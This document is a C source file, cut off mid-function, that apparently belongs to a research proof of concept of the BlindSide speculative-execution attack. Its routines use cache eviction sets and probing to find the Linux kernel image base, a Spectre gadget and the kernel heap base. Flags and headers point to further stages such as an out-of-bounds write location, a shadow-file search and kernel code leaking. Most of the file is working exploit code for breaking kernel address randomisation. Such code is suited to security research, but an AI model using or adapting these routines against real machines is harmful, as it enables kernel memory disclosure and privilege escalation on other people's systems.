#include "kernel_offset_index_mapping.h"
#include "kmod_driver.h"
#include "memprep.h"
#include "memwrite.h"
#include "matrix.h"
#include "specex_utils.h"
#include "specex_leaks.h"
#include "config.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

#ifndef SKIP_FINDING_KIMAGE
#define SKIP_FINDING_KIMAGE               0
#endif
#ifndef SKIP_FINDING_SPECTRE_GADGET
#define SKIP_FINDING_SPECTRE_GADGET       0
#endif
#ifndef SKIP_FINDING_HEAP
#define SKIP_FINDING_HEAP                 0
#endif
#ifndef SKIP_FINDING_OOB_WRITE_LOCATION
#define SKIP_FINDING_OOB_WRITE_LOCATION   0
#endif
#ifndef SKIP_FINDING_USER_PAGE
#define SKIP_FINDING_USER_PAGE            0
#endif
#ifndef SKIP_FINDING_SHADOW_FILE
#define SKIP_FINDING_SHADOW_FILE          0
#endif
#ifndef SKIP_LEAKING_KERNEL_CODE
#define SKIP_LEAKING_KERNEL_CODE          0
#endif

#define NUM_EVICSETS 128
#define NUM_CACHELINES_PAGE 64

#define ONE_MB   (1024ul*1024)
#define TWO_MB   (2*ONE_MB)
#define EIGHT_MB (8*ONE_MB)
#define ONE_GB   (1024*ONE_MB)

#define KERNEL_SEARCH_THRESHOLD 0.783
#define HEAP_SEARCH_THRESHOLD 0.522
#define HEAP_SEARCH_THRESHOLD_SPECTRE 0.468

void * get_sock_addr(int s) {
  void *sock_addr = NULL;

  int res = kd_get_sock_kaddr(s, &sock_addr);
  if (res) {
    fprintf(stderr, "Failed getting kernel virt addr of socket object. res: %d. exiting..", res);
    exit(1);
  }

  return sock_addr;
}

void * get_phys_addr(void* addr) {
  void *phys_addr = NULL;

  int res = kd_get_phys_addr(addr, &phys_addr);
  if (res) {
    fprintf(stderr, "Failed translating virtual address to physical address. res: %d. exiting..", res);
    exit(1);
  }

  return phys_addr;
}

void * get_kimage_base() {
  void *kimage_base = NULL;

  int res = kd_get_kimage_base(&kimage_base);
  if (res) {
    fprintf(stderr, "Failed to get kernel image base. res: %d. exiting..", res);
    exit(1);
  }

  return kimage_base;
}

void * get_spectre_addr() {
  void *spectre_addr = NULL;

  int res = kd_get_spectre_addr(&spectre_addr);
  if (res) {
    fprintf(stderr, "Failed to get spectre gadget addr. res: %d. exiting..", res);
    exit(1);
  }

  return spectre_addr;
}

void * get_physmap_base() {
  void *physmap_base = NULL;

  int res = kd_get_physmap_base(&physmap_base);
  if (res) {
    fprintf(stderr, "Failed to get physmap base. res: %d. exiting..", res);
    exit(1);
  }

  return physmap_base;
}

void get_bytes(void* addr, char* byte_array, unsigned long num_bytes) {
  int res = kd_get_bytes(addr, byte_array, num_bytes);
  if (res) {
    printf("kd_get_bytes failed: %d\n", res);
    exit(1);
  }
}

void get_activity_in_evicset_filter(int evicset_idx, Matrix* m, Matrix* filter) {
  int num_execs = 40;
  int cl;

  for (cl = 0; cl < NUM_CACHELINES_PAGE; cl++) {
    if (filter && get_value(filter, evicset_idx, cl) == -1) {
      set_value(m, evicset_idx, cl, -1);
      continue;
    }

    int got_signal = specex_check_signal_pp(num_execs, (int) (num_execs * 0.05), evicset_idx, cl);
    set_value(m, evicset_idx, cl, got_signal);
  }
}

void get_activity_in_cache_filter(Matrix* m, Matrix* filter) {
  int e;
  for (e = 0; e < NUM_EVICSETS; e++) {
    get_activity_in_evicset_filter(e, m, filter);
  }
}

// Code Probing
extern int specex_socket_second;
Matrix* kernel_search_cache = NULL;
Matrix* kernel_search_test_evicsets = NULL;
int kernel_search_skip_cachelines[NUM_CACHELINES_PAGE];
int kernel_search_skip_evicsets[NUM_EVICSETS];
#define KERNEL_SEARCH_NUM_CACHELINES 10
int kernel_search_test_cachelines[KERNEL_SEARCH_NUM_CACHELINES];
int num_kernel_search_test_cachelines = 0;
int find_non_evicted_cachesets_for_kernel_base_searching() {
  // iteration variables
  int cl_idx, evicset_idx;

  // variables for cache measurements
  int evicset_evicted;

  // set deref values to 0x0 to avoid having a signal
  write_fptr(specex_socket_second, 0x0, 8);

  // find cache sets with 0 evictions. these sets are later checked for signals.
  get_activity_in_cache_filter(kernel_search_cache, NULL);

  // Set cachelines and evicsets to be tested
  memset(kernel_search_skip_cachelines, 0, sizeof(kernel_search_skip_cachelines));
  memset(kernel_search_skip_evicsets, 0, sizeof(kernel_search_skip_evicsets));
  memset(kernel_search_test_cachelines, 0xff, sizeof(kernel_search_test_cachelines));
  int evicsets_skipped = 0;
  int min_evicset_evicted_cacheline = -1;
  int min_evicset_evicted = 0;

  while(evicsets_skipped < NUM_EVICSETS && num_kernel_search_test_cachelines < KERNEL_SEARCH_NUM_CACHELINES) {
    min_evicset_evicted_cacheline = -1;
    min_evicset_evicted = -1;

    // find cacheline idx with least amount of evictions
    for (cl_idx = 0x100/0x40; cl_idx < 0xf00/0x40; ++cl_idx) {
      if (kernel_search_skip_cachelines[cl_idx]) continue;

      evicset_evicted = 0;

      for (evicset_idx = 0; evicset_idx < NUM_EVICSETS; ++evicset_idx) {
        if (kernel_search_skip_evicsets[evicset_idx]) continue;

        int got_signal = get_value(kernel_search_cache, evicset_idx, cl_idx);
        if (got_signal) {
          evicset_evicted += 1;
        }
      }

      if (min_evicset_evicted > evicset_evicted || min_evicset_evicted == -1) {
        min_evicset_evicted = evicset_evicted;
        min_evicset_evicted_cacheline = cl_idx;
      }
    }

    if (min_evicset_evicted > 100) {
      printf("[-] too many evicted in one iteration.. machine is unexpectedly too busy..\n");
      return 1;
    }

    // Save evicsets to be tested for set cacheline idx, also
    // ensure cacheline and evicsets are skipped in the next iteration:
    int num_new_eviction_sets = 0;
    for (evicset_idx = 0; evicset_idx < NUM_EVICSETS; ++evicset_idx) {
      if (kernel_search_skip_evicsets[evicset_idx]) continue;

      int got_signal = get_value(kernel_search_cache, evicset_idx, min_evicset_evicted_cacheline);
      if (!got_signal) {
        set_value(kernel_search_test_evicsets, num_kernel_search_test_cachelines, evicset_idx, 1);
        kernel_search_skip_evicsets[evicset_idx] = 1;
        num_new_eviction_sets += 1;
      }
    }
    if (num_new_eviction_sets == 0) {
      printf("Failed to find new eviction sets with non-evicted cachesets\n");
      return 1;
    }

    kernel_search_skip_cachelines[min_evicset_evicted_cacheline] = 1;

    // Save cacheline that has to be checked
    kernel_search_test_cachelines[num_kernel_search_test_cachelines] = min_evicset_evicted_cacheline;
    num_kernel_search_test_cachelines += 1;

    // If all evicsets get skipped, we are done
    evicsets_skipped = 0;
    for (evicset_idx = 0; evicset_idx < NUM_EVICSETS; ++evicset_idx) {
      if (kernel_search_skip_evicsets[evicset_idx]) {
        evicsets_skipped += 1;
      }
    }
  }

  if (evicsets_skipped < NUM_EVICSETS) {
    printf("[-] failed to find non-evicted cachesets in all eviction sets..\n");
    return 1;
  }

  return 0;
}

#define NUM_VERIFICATIONS 7
unsigned long find_kernel_image() {
  unsigned long kernel_base = 0x0;
  printf("\n[.] searching for kernel base address..\n");
#if SKIP_FINDING_KIMAGE
  printf("[.]  >> (user configured to skip searching with BlindSide)\n");
  kernel_base = (unsigned long) get_kimage_base();
#else
  int num_execs = 14; // 40;

  // save cachesets to test
  if (find_non_evicted_cachesets_for_kernel_base_searching()) {
    printf("Failed to find non-evicted cachesets for kernel base search. Consider recreating evicsets? Exiting..\n");
    exit(1);
  }

  printf("[.]  >> found non-evicted cachesets to test during search (checking cachesets in 128 eviction sets)\n");

  // Next: seek for kernel base.
  // search in steps of alignment: 0x200000 (2MB)
  // in region: [0xffffffff80000000, 0xffffffff80000000 + 1GB]

  // iteration variables
  int i, j;
  int cl_idx, tmp_cl_idx, evicset_idx;

  unsigned long steps = EIGHT_MB; // we know kernel text size is > 8 MB
  int found = 0;
  unsigned long try_addr = 0xffffffff80000000ul;

  printf("[.]  >> scanning in range: 0x%lx - 0x%lx\n", try_addr, try_addr + ONE_GB);
  printf("[.]  >> step size = 0x%lx\n", steps);

  struct timespec start, finish;
  double elapsed = 0;
  clock_gettime(CLOCK_MONOTONIC, &start);

  int num_probed_addr = 0;
  int print_progress = 0;
  int cl_rand = rand() % 64;
  while (!found && try_addr < (0xffffffff80000000 + (1*ONE_GB))) {
    // do stage a: seek signal in cache
    if ( (try_addr - 0xffffffff80000000) % 0x8000000 == 0 || print_progress) {
      clock_gettime(CLOCK_MONOTONIC, &finish);
      elapsed = (finish.tv_sec - start.tv_sec);
      elapsed += (finish.tv_nsec - start.tv_nsec) / 1000000000.0;

      printf("\r[.]  >> scanning @ 0x%lx (%.2f%%) - #probed_addresses=%d - elapsed_time=%.3f sec",
              try_addr, 100.0  * (try_addr - 0xffffffff80000000) / (1*ONE_GB), num_probed_addr, elapsed);
      fflush(stdout);
      print_progress = 0;
    }
    num_probed_addr += 1;
    for (i = 0; i < num_kernel_search_test_cachelines; ++i) {
      cl_idx = kernel_search_test_cachelines[i];
      write_fptr(specex_socket_second, try_addr + cl_idx*0x40, 8);
      //usleep(5000);

      for (evicset_idx = 0; evicset_idx < NUM_EVICSETS; ++evicset_idx) {
        if (get_value(kernel_search_test_evicsets, i, evicset_idx) == 0) continue;

        int got_signal = specex_check_signal_pp(num_execs, (int) (num_execs * KERNEL_SEARCH_THRESHOLD), evicset_idx, cl_idx);
        if (got_signal) {
          // do stage b: test if we found kernel base
          found = 1;
          int num_tests = 0;
          for (j = 0; j < NUM_CACHELINES_PAGE && num_tests < NUM_VERIFICATIONS; j++) {
            tmp_cl_idx = ((j+cl_rand) * 167 + 13) & 0x3f;
            if(tmp_cl_idx == cl_idx || get_value(kernel_search_cache, evicset_idx, tmp_cl_idx)) {
              continue;
            }

            write_fptr(specex_socket_second, try_addr + tmp_cl_idx*0x40, 8);

            int got_signal = specex_check_signal_pp(num_execs, (int) (num_execs * KERNEL_SEARCH_THRESHOLD), evicset_idx, tmp_cl_idx);
            if (!got_signal) {
              found = 0;
              break;
            }

            num_tests += 1;
          }
          if (found && num_tests < NUM_VERIFICATIONS) {
            // make sure we do enough tests
            printf("\n!! WARNING: not enough tests performed: %d", num_tests);
          }

          if (found) {
            // check if it was noise
            write_fptr(specex_socket_second, 0x0, 8);
            int got_signal = specex_check_signal_pp(num_execs, (int) (num_execs * KERNEL_SEARCH_THRESHOLD), evicset_idx, cl_idx);
            if (got_signal) {
              found = 0;
              printf("\n[.]  >> false signal in page 0x%lx (stage 3)\n", try_addr);
              try_addr -= steps;
              goto retry_kernel_search;
            }
          }

          if (found) {
            printf("\n[.]  >> found code page @ 0x%lx - #probed_addresses=%d\n", try_addr, num_probed_addr);
            break;
          } else {
            // write back stage 1a pointer
            write_fptr(specex_socket_second, try_addr + cl_idx*0x40, 8);
          }
        }
      }
      if (found) {
        break;
      }
    }

    if (found) {
      if (steps == TWO_MB) {
        break;
      } else {
        try_addr -= steps;
        steps = TWO_MB;
        found = 0;
        print_progress = 1;

        printf("[.]  >> step back, lower step size and continue scanning\n");
        printf("[.]  >> step size = 0x%lx\n", steps);
      }
    }

retry_kernel_search:
    try_addr += steps;
  }
  if (!found) {
    printf("\n");
  }

  clock_gettime(CLOCK_MONOTONIC, &finish);
  elapsed = (finish.tv_sec - start.tv_sec);
  elapsed += (finish.tv_nsec - start.tv_nsec) / 1000000000.0;
  printf("[.]  >> finished scanning in %.3f sec\n", elapsed);

  if (!found) {
    printf("[-] 1. Failed to fined kernel image base. exiting..\n");
    exit(1);
  }

  kernel_base = try_addr & ~(TWO_MB-1);
#endif

  printf("[.]  >> kernel base address = 0x%lx\n", kernel_base);
  printf("[.] searching for kernel base address.. DONE\n");
  return kernel_base;
}

int test_candidate_evicset_idx_for_code_page(unsigned long code_page_addr, int evicset_idx, int cacheline_idx) {
  int num_execs = 14;

  write_fptr(specex_socket_second, code_page_addr + cacheline_idx * 0x40, 8);

  return specex_check_signal_pp(num_execs, (int) (num_execs * KERNEL_SEARCH_THRESHOLD), evicset_idx, cacheline_idx);
}

int find_code_page_evicset_idx(unsigned long code_page_addr) {
  int i;
  int num_candidates = NUM_EVICSETS;
  int candidates[NUM_EVICSETS];

  for (i = 0; i < NUM_EVICSETS; i++) {
    candidates[i] = 1; // set all indices as candidates
  }

  int tested_cachelines = 0;
  int cl_rand = rand() % 64;
  while (num_candidates > 1 && tested_cachelines < NUM_CACHELINES_PAGE) {
    int cacheline_idx = ((tested_cachelines+cl_rand) * 167 + 13) & 0x3f;

    for (i = 0; i < NUM_EVICSETS; i++) {
      if (candidates[i] != 1) {
        continue;
      }

      int good_candidate = test_candidate_evicset_idx_for_code_page(code_page_addr, i, cacheline_idx);
      if (!good_candidate) {
        num_candidates -= 1;
        candidates[i] = 0;
      }
    }

    tested_cachelines += 1;
  }

  if (num_candidates != 1) {
    printf("[-] Went through all stages to find code page evicset idx but failed..\n");
    exit(1);
  }

  // assert found evicset idx is right
  int evicset_idx = -1;
  for (i = 0; i < NUM_EVICSETS; i++) {
    if (candidates[i] == 1) {
      evicset_idx = i;
      break;
    }
  }

  if (evicset_idx == -1) {
    printf("[-] Could not find code page evicset idx. exiting..\n");
    exit(1);
  }

  return evicset_idx;
}

// Gadget Probing
#define GADGET_SEARCH_THRESHOLD 0.450
unsigned long find_spectre_gadget(unsigned long kernel_base) {
  unsigned long gadget_addr = 0x0;
  printf("\n[.] searching for spectre gadget..\n");
#if SKIP_FINDING_SPECTRE_GADGET
  printf("[.]  >> (user configured to skip searching with BlindSide)\n");
  gadget_addr = (unsigned long) get_spectre_addr();
#else
  int num_execs = 44;
  int i;

  unsigned long spectre_array_addr = kernel_base;
  int spectre_array_evicset_idx = find_code_page_evicset_idx(spectre_array_addr);
  printf("[.]  >> found eviction set of code page where signal will land (using no gadget)\n");

  int evicted_cachesets[64];
  memset(evicted_cachesets, 0, sizeof(evicted_cachesets));

  write_fptr(specex_socket_second, 0x0, 8);
  int cl_rand = rand() % 64;
  int num_non_evicted = 0;
  for (i = 0; i < 64; i++) {
    int cidx = ((i+cl_rand) * 167 + 13) & 0x3f;
    if (kernel_offset_index_mapping[cidx] == 0x0) {
      continue;
    }

    evicted_cachesets[cidx] = specex_check_signal_pp(num_execs, (int) (num_execs*0.05), spectre_array_evicset_idx, cidx);
    num_non_evicted += !evicted_cachesets[cidx];
  }
  printf("[.]  >> found non-evicted cachesets to test during search (checking cachesets in 1 eviction set)\n");

  // Find cacheline that is not evicted and to use during search for signal with spectre gadget
  int cl_idx;
  int cl_rand2 = rand() % 64;
  for (i = 0; i < 64; i++) {
    int cidx = ((i+cl_rand2) * 167 + 13) & 0x3f;
    if (kernel_offset_index_mapping[cidx] == 0x0) {
      continue;
    }

    if(!evicted_cachesets[cidx]) {
      cl_idx = cidx;
      break;
    }
  }

  unsigned long steps = 16;
  int found = 0;
  unsigned long try_addr = kernel_base;

  printf("[.]  >> scanning in range: 0x%lx - 0x%lx\n", try_addr, (unsigned long) (kernel_base + (8.5*ONE_MB)));
  printf("[.]  >> step size = 0x%lx\n", steps);

  struct timespec start, finish;
  double elapsed = 0;
  clock_gettime(CLOCK_MONOTONIC, &start);

  int num_probed_addr = 0;
  int print_progress = 1;
  int cl_rand3 = rand() % 64;
  while (!found && try_addr < (unsigned long) (kernel_base + (8.5*ONE_MB))) {
    if ( (try_addr - kernel_base) % 0x40000 == 0 || print_progress) {
      clock_gettime(CLOCK_MONOTONIC, &finish);
      elapsed = (finish.tv_sec - start.tv_sec);
      elapsed += (finish.tv_nsec - start.tv_nsec) / 1000000000.0;

      printf("\r[.]  >> scanning @ 0x%lx (%.2f%%) - #probed_addresses=%d - elapsed_time=%.3f sec",
          try_addr, 100.0  * (try_addr - kernel_base) / (8.5*ONE_MB), num_probed_addr, elapsed);
      fflush(stdout);
      print_progress = 0;
    }
    num_probed_addr += 1;

    // seek signal in cache
    unsigned int index_offset = kernel_offset_index_mapping[cl_idx];
    write_spectre_data(specex_socket_second, try_addr, spectre_array_addr, kernel_base + index_offset);

    int got_signal = specex_check_signal_pp(num_execs, (int) (num_execs * GADGET_SEARCH_THRESHOLD), spectre_array_evicset_idx, cl_idx);
    if (got_signal) {
      // test if we found spectre gadget
      found = 1;
      int x = 0;
      int num_tested_cachelines = 0;
      while (x < NUM_CACHELINES_PAGE && num_tested_cachelines < NUM_VERIFICATIONS) {
        int tmp_cl_idx = ((x+cl_rand3) * 167 + 13) & 0x3f;
        if (tmp_cl_idx == cl_idx || kernel_offset_index_mapping[tmp_cl_idx] == 0x0 || evicted_cachesets[tmp_cl_idx]) {
          x += 1;
          continue;
        }

        int verification_index_offset = kernel_offset_index_mapping[tmp_cl_idx];
        write_spectre_data(specex_socket_second, try_addr, spectre_array_addr, kernel_base + verification_index_offset);

        int got_signal = specex_check_signal_pp(num_execs, (int) (num_execs * GADGET_SEARCH_THRESHOLD), spectre_array_evicset_idx, tmp_cl_idx);
        // test for fails
        if (!got_signal) {
          found = 0;
          break;
        }

        x += 1;
        num_tested_cachelines += 1;
      }
      if (found && num_tested_cachelines < NUM_VERIFICATIONS) {
        printf("\nWARNING.. verification unreliable.. too few tests: %d..\n", num_tested_cachelines);

        try_addr = kernel_base - steps;
        found = 0;
      }

      if (found) {
        // check if it was noise
        write_spectre_data(specex_socket_second, try_addr, 0x0, kernel_base + index_offset);
        int got_signal = specex_check_signal_pp(num_execs, (int) (num_execs * GADGET_SEARCH_THRESHOLD), spectre_array_evicset_idx, cl_idx);
        if (got_signal) {
          found = 0;
          printf("\n[.]  >> false signal in page 0x%lx (stage 3)\n", try_addr);
          try_addr -= steps;
          goto retry_gadget_search;
        }
      }

      if (found) {
        printf("\n[.]  >> found gadget @ 0x%lx - #probed_addresses=%d\n", try_addr, num_probed_addr);
        break;
      } else {
        // write back stage a pointer
        write_spectre_data(specex_socket_second, try_addr, spectre_array_addr, kernel_base + index_offset);
      }
    }

    if (found) {
      break;
    }

retry_gadget_search:
    try_addr += steps;
  }
  if (!found) {
    printf("\n");
  }

  clock_gettime(CLOCK_MONOTONIC, &finish);
  elapsed = (finish.tv_sec - start.tv_sec);
  elapsed += (finish.tv_nsec - start.tv_nsec) / 1000000000.0;
  printf("[.]  >> finished scanning in %.3f sec\n", elapsed);

  if (!found) {
    printf("[-]  >> failed to find base of gadget address. exiting..\n");
    exit(1);
  }

  gadget_addr = try_addr;
#endif
  printf("[.]  >> spectre gadget address = 0x%lx\n", gadget_addr);
  printf("[.] searching for spectre gadget.. DONE\n");
  return gadget_addr;
}

// Data Probing
// In consecutive first and second dereferences we use 1 less cacheline.
int skip_cachelines[NUM_CACHELINES_PAGE];
int skip_evicsets[NUM_EVICSETS];
#define HEAP_SEARCH_NUM_CACHELINES 10
int heap_search_test_cachelines[HEAP_SEARCH_NUM_CACHELINES];
int num_heap_search_test_cachelines = 0;
Matrix* heap_search_cache = NULL;
Matrix* heap_search_test_evicsets = NULL;

int find_non_evicted_cachesets_for_heap_base_searching() {
  // iteration variables
  int cl_idx, evicset_idx;

  // variables for cache measurements
  int evicset_evicted;

  // find cache sets with 0 evictions. these sets are later checked for signals.
  get_activity_in_cache_filter(heap_search_cache, NULL);

  // Set cachelines and evicsets to be tested
  memset(skip_cachelines, 0, sizeof(skip_cachelines));
  memset(skip_evicsets, 0, sizeof(skip_evicsets));
  memset(heap_search_test_cachelines, 0xff, sizeof(heap_search_test_cachelines));
  int evicsets_skipped = 0;
  int min_evicset_evicted_cacheline = -1;
  int min_evicset_evicted = 0;

  while(evicsets_skipped < NUM_EVICSETS && num_heap_search_test_cachelines < HEAP_SEARCH_NUM_CACHELINES) {
    min_evicset_evicted_cacheline = -1;
    min_evicset_evicted = -1;

    // find cacheline idx with least amount of evictions
    for (cl_idx = 0x100/0x40; cl_idx < 0xf00/0x40; ++cl_idx) {
      if (skip_cachelines[cl_idx]) continue;

      evicset_evicted = 0;

      for (evicset_idx = 0; evicset_idx < NUM_EVICSETS; ++evicset_idx) {
        if (skip_evicsets[evicset_idx]) continue;

        int got_signal = get_value(heap_search_cache, evicset_idx, cl_idx);
        if (got_signal) {
          evicset_evicted += 1;
        }
      }

      if (min_evicset_evicted > evicset_evicted || min_evicset_evicted == -1) {
        min_evicset_evicted = evicset_evicted;
        min_evicset_evicted_cacheline = cl_idx;
      }
    }

    if (min_evicset_evicted > 100) {
      printf("[-] too many evicted in one iteration.. machine is unexpectedly too busy..\n");
      return 1;
    }

    // Save evicsets to be tested for set cacheline idx, also
    // ensure cacheline and evicsets are skipped in the next iteration:
    int num_new_eviction_sets = 0;
    for (evicset_idx = 0; evicset_idx < NUM_EVICSETS; ++evicset_idx) {
      if (skip_evicsets[evicset_idx]) continue;

      int got_signal = get_value(heap_search_cache, evicset_idx, min_evicset_evicted_cacheline);
      if (!got_signal) {
        set_value(heap_search_test_evicsets, num_heap_search_test_cachelines, evicset_idx, 1);
        skip_evicsets[evicset_idx] = 1;
        num_new_eviction_sets += 1;
      }
    }
    if (num_new_eviction_sets == 0) {
      printf("Failed to find new eviction sets with non-evicted cachesets\n");
      return 1;
    }

    skip_cachelines[min_evicset_evicted_cacheline] = 1;

    // Save cacheline that has to be checked
    heap_search_test_cachelines[num_heap_search_test_cachelines] = min_evicset_evicted_cacheline;
    num_heap_search_test_cachelines += 1;

    // If all evicsets get skipped, we are done
    evicsets_skipped = 0;
    for (evicset_idx = 0; evicset_idx < NUM_EVICSETS; ++evicset_idx) {
      if (skip_evicsets[evicset_idx]) {
        evicsets_skipped += 1;
      }
    }
  }

  if (evicsets_skipped < NUM_EVICSETS) {
    printf("[-] failed to find non-evicted cachesets in all eviction sets..\n");
    return 1;
  }

  return 0;
}

#define OFFSET_HEAP_OBJ_LEAKING_GADGET  0x14633ul
unsigned long find_heap_base_2deref(unsigned long kernel_base_address) {
  unsigned long heap_base = 0x0;
  printf("\n[.] searching for heap base address..\n");
#if SKIP_FINDING_HEAP
  printf("[.]  >> (user configured to skip searching with BlindSide)\n");
  heap_base = (unsigned long) get_physmap_base();
#else
  int num_execs = 36;

  unsigned long gadget_addr = kernel_base_address + OFFSET_HEAP_OBJ_LEAKING_GADGET;
  write_fptr(specex_socket_second, gadget_addr, 8);
  printf("[.]  >> using 2 deref gadget @ 0x%lx for scanning\n", gadget_addr);

  // set deref values to 0x0 for pinpointing cachesets that are evicted by default
  write_data_pointers(specex_socket_second, 0x0, 0x0);

  // get the non evicted cachesets which will be used for signal testing
  if (find_non_evicted_cachesets_for_heap_base_searching()) {
    printf("Failed to find non-evicted cachesets for heap base search. Consider recreating evicsets? Exiting..\n");
    exit(1);
  }

  printf("[.]  >> found non-evicted cachesets to test during search (checking cachesets in 128 eviction sets)\n");

  // iteration variables
  int i, j;
  int cl_idx, tmp_cl_idx, evicset_idx;

  unsigned long steps = 8*ONE_GB;
  int found = 0;
  unsigned long try_addr = 0xffff880000000000ul;

  printf("[.]  >> scanning in range: 0x%lx - 0x%lx\n", try_addr, try_addr + (28*1024*ONE_GB));
  printf("[.]  >> step size = 0x%lx\n", steps);

  struct timespec start, finish;
  double elapsed = 0;
  clock_gettime(CLOCK_MONOTONIC, &start);

  int num_probed_addr = 0;
  int print_progress = 0;
  int cl_rand = rand() % 64;
  while (!found && try_addr < (0xffff880000000000 + (28*1024*ONE_GB))) {
    if ( (try_addr - 0xffff880000000000) % 0x2000000000 == 0 || print_progress) {
      clock_gettime(CLOCK_MONOTONIC, &finish);
      elapsed = (finish.tv_sec - start.tv_sec);
      elapsed += (finish.tv_nsec - start.tv_nsec) / 1000000000.0;

      printf("\r[.]  >> scanning @ 0x%lx (%.2f%%) - #probed_addresses=%d - elapsed_time=%.3f sec",
              try_addr, 100.0  * (try_addr - 0xffff880000000000) / (28*1024*ONE_GB), num_probed_addr, elapsed);
      fflush(stdout);
      print_progress = 0;
    }
    num_probed_addr += 1;
    // do stage a: seek signal in cache
    for (i = 0; i < num_heap_search_test_cachelines; ++i) {
      cl_idx = heap_search_test_cachelines[i];
      write_data_pointers(specex_socket_second, try_addr + cl_idx*0x40 - 0x138, 0x0);

      for (evicset_idx = 0; evicset_idx < NUM_EVICSETS; ++evicset_idx) {
        if (get_value(heap_search_test_evicsets, i, evicset_idx) == 0) continue;

        int got_signal = specex_check_signal_pp(num_execs, (int) (num_execs * HEAP_SEARCH_THRESHOLD), evicset_idx, cl_idx);
        if (got_signal) {
          // do stage b: test if we found heap base
          found = 1;
          int num_tests = 0;
          for (j = 0; j < NUM_CACHELINES_PAGE && num_tests < NUM_VERIFICATIONS; j++) {
            tmp_cl_idx = ((j+cl_rand) * 167 + 13) & 0x3f;
            if(tmp_cl_idx == cl_idx || get_value(heap_search_cache, evicset_idx, tmp_cl_idx)) {
              continue;
            }

            write_data_pointers(specex_socket_second, try_addr + tmp_cl_idx*0x40 - 0x138, 0x0);

            int got_signal = specex_check_signal_pp(num_execs, (int) (num_execs * HEAP_SEARCH_THRESHOLD), evicset_idx, tmp_cl_idx);
            if (!got_signal) {
              found = 0;
              break;
            }

            num_tests += 1;
          }
          if (found && num_tests < NUM_VERIFICATIONS) {
            // make sure we do enough tests
            printf("\n!! WARNING: not enough tests performed: %d\n", num_tests);
          }

          if (found) {
            // check if it was noise
            write_data_pointers(specex_socket_second, 0x0, 0x0);
            int got_signal = specex_check_signal_pp(num_execs, (int) (num_execs * HEAP_SEARCH_THRESHOLD), evicset_idx, cl_idx);
            if (got_signal) {
              found = 0;
              printf("\n[.]  >> false signal in page 0x%lx (stage 3)\n", try_addr);
              try_addr -= steps;
              goto retry_heap_search;
            }
          }

          if (found) {
            printf("\n[.]  >> found data page @ 0x%lx - #probed_addresses=%d\n", try_addr, num_probed_addr);
            break;
          } else {
            // write back stage a pointer
            write_data_pointers(specex_socket_second, try_addr + cl_idx*0x40 - 0x138, 0x0);
          }
        }
      }
      if (found) {
        break;
      }
    }

    if (found) {
      if (steps == ONE_GB) {
        break;
      } else {
        try_addr -= 2*steps;
        steps = ONE_GB;
        found = 0;
        print_progress = 1;
        printf("[.]  >> step back, lower step size and continue scanning\n");
        printf("[.]  >> step size = 0x%lx\n", steps);
      }
    }

retry_heap_search:
    try_addr += steps;
  }
  if (!found) {
    printf("\n");
  }

  clock_gettime(CLOCK_MONOTONIC, &finish);
  elapsed = (finish.tv_sec - start.tv_sec);
  elapsed += (finish.tv_nsec - start.tv_nsec) / 1000000000.0;
  printf("[.]  >> finished scanning in %.3f sec\n", elapsed);

  if (!found) {
    printf("[-]  >> failed to find base of heap memory. exiting..\n");
    exit(1);
  }

  heap_base = try_addr & ~(ONE_GB-1);
#endif
  printf("[.]  >> heap base address = 0x%lx\n", heap_base);
  printf("[.] searching for heap base address.. DONE\n");
  return heap_base;
}

unsigned long find_heap_base_spectre(unsigned long spectre_gadget_address) {
  unsigned long heap_base = 0x0;
  printf("\n[.] searching for heap base address..\n");
#if SKIP_FINDING_HEAP
  printf("[.]  >> (user configured to skip searching with BlindSide)\n");
  heap_base = (unsigned long) get_physmap_base();
#else
  int num_execs = 21;

  // set deref values to 0x0 for pinpointing cachesets that are evicted by default
  write_spectre_data(specex_socket_second, spectre_gadget_address, 0x0, 0x0);
  printf("[.]  >> using spectre gadget @ 0x%lx for scanning\n", spectre_gadget_address);

  // get the non evicted cachesets which will be used for signal testing
  if (find_non_evicted_cachesets_for_heap_base_searching()) {
    printf("Failed to find non-evicted cachesets for heap base search. Consider recreating evicsets? Exiting\n");
    exit(1);
  }
  printf("[.]  >> found non-evicted cachesets to test during search (checking cachesets in 128 eviction sets)\n");

  // iteration variables
  int i, j;
  int cl_idx, tmp_cl_idx, evicset_idx;

  unsigned long steps = 8*ONE_GB;
  int found = 0;
  unsigned long try_addr = 0xffff880000000000ul;

  printf("[.]  >> scanning in range: 0x%lx - 0x%lx\n", try_addr, try_addr + (28*1024*ONE_GB));
  printf("[.]  >> step size = 0x%lx\n", steps);

  struct timespec start, finish;
  double elapsed = 0;
  clock_gettime(CLOCK_MONOTONIC, &start);

  int num_probed_addr = 0;
  int print_progress = 0;
  int cl_rand = rand() % 64;
  while (!found && try_addr < (0xffff880000000000 + (28*1024*ONE_GB))) {
    if ( (try_addr - 0xffff880000000000) % 0x2000000000 == 0 || print_progress) {
      clock_gettime(CLOCK_MONOTONIC, &finish);
      elapsed = (finish.tv_sec - start.tv_sec);
      elapsed += (finish.tv_nsec - start.tv_nsec) / 1000000000.0;

      printf("\r[.]  >> scanning @ 0x%lx (%.2f%%) - #probed_addresses=%d - elapsed_time=%.3f sec",
              try_addr, 100.0  * (try_addr - 0xffff880000000000) / (28*1024*ONE_GB), num_probed_addr, elapsed);
      fflush(stdout);
      print_progress = 0;
    }
    num_probed_addr += 1;
    // do stage a: seek signal in cache
    for (i = 0; i < num_heap_search_test_cachelines; ++i) {
      cl_idx = heap_search_test_cachelines[i];
      write_spectre_data(specex_socket_second, spectre_gadget_address, 0x0, try_addr + cl_idx * 0x40 + 0x28);

      for (evicset_idx = 0; evicset_idx < NUM_EVICSETS; ++evicset_idx) {
        if (get_value(heap_search_test_evicsets, i, evicset_idx) == 0) continue;

        int got_signal = specex_check_signal_pp(num_execs, (int) (num_execs * HEAP_SEARCH_THRESHOLD_SPECTRE), evicset_idx, cl_idx);
        if (got_signal) {
          // do stage b: test if we found heap base
          found = 1;
          int num_tests = 0;
          for (j = 0; j < NUM_CACHELINES_PAGE && num_tests < NUM_VERIFICATIONS; j++) {
            tmp_cl_idx = ((j+cl_rand) * 167 + 13) & 0x3f;
            if(tmp_cl_idx == cl_idx || get_value(heap_search_cache, evicset_idx, tmp_cl_idx)) {
              continue;
            }

            write_spectre_data(specex_socket_second, spectre_gadget_address, 0x0, try_addr + tmp_cl_idx * 0x40 + 0x28);

            int got_signal = specex_check_signal_pp(num_execs, (int) (num_execs * HEAP_SEARCH_THRESHOLD_SPECTRE), evicset_idx, tmp_cl_idx);
            if (!got_signal) {
              found = 0;
              break;
            }

            num_tests += 1;
